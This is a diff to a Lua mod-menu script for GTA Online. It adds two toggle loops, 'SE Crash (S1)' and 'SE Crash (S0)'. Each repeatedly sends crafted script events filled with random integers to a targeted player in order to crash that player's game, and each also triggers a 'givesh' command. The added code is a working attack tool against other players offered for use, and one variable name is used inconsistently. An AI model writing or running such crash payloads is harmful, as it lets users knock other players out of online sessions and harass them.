@@ -12325,6 +12325,45 @@ menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
 
             local scrash = menu.list(crash, "Script Event Crashes", {}, "")
 
+            
+            menu.toggle_loop(scrash, "SE Crash (S1)", {""}, "A very strong SE/SH crash", function(on_toggle)
+                notification("Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                        local int_min = -2147483647
+                        local int_max = 2147483647
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {526822748, 1, 0, 2126548485, math.random(int_min, int_max), math.random(int_min, int_max), 
+                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {526822748, 1, 0, 2126548485})
+                            end
+                            menu.trigger_commands("givesh" .. players.get_name(pid))
+                            util.yield()
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {526822748, 1, 0, 2126548485, pid, math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {526822748, 1, 0, 2126548485})
+                            end
+                    util.trigger_script_event(1 << pid, {526822748, 1, 0, 2126548485})
+                        end)
+        
+            menu.toggle_loop(scrash, "SE Crash (S0)", {""}, "A very strong SE/SH crash", function(on_toggle)
+            notification("Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                        local int_min = -2147483647
+                        local int_max = 2147483647
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-555356783, 1, 1, 2024683308, math.random(int_min, int_max), math.random(int_min, int_max), 
+                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {-555356783, 1, 1, 2024683308})
+                            end
+                            menu.trigger_commands("givesh" .. players.get_name(pid))
+                            util.yield()
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-555356783, 1, 1, 2024683308, pid, math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {-555356783, 1, 1, 2024683308})
+                            end
+                    util.trigger_script_event(1 << pid, {-555356783, 1, 1, 2024683308})
+                        end)
+
             menu.toggle_loop(scrash, "SE Crash (S0)", {"crashs0"}, "A very strong SE/SH crash", function(on_toggle)
             notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                     local int_min = -2147483647
